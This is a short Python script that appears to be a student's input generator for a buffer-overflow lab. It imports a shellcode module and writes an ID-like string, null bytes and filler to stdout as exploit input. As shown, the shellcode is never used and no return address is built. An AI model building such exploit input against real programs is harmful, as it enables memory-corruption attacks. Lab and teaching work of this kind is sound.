#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

sys.stdout.buffer.write(b'hongyil7\x00\x00')
sys.stdout.buffer.write(b'A+')
sys.stdout.buffer.write(b'\x00'*2)
